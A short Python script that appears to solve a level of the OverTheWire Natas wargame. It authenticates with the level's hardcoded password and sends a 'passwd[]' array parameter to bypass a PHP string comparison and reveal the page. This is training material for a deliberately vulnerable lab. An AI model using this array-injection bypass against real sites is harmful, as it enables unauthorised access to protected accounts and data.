import requests
from requests.auth import HTTPBasicAuth

url = "http://natas24.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas24", "shlL4BvOtawNCd81dwdKRHFzmTEjYYQX")

# create a session object to maintain cookies and authentication between requests
session = requests.Session()
session.auth = auth

response = session.get(url, auth=auth, params={"passwd[]": 1})
print(response.text)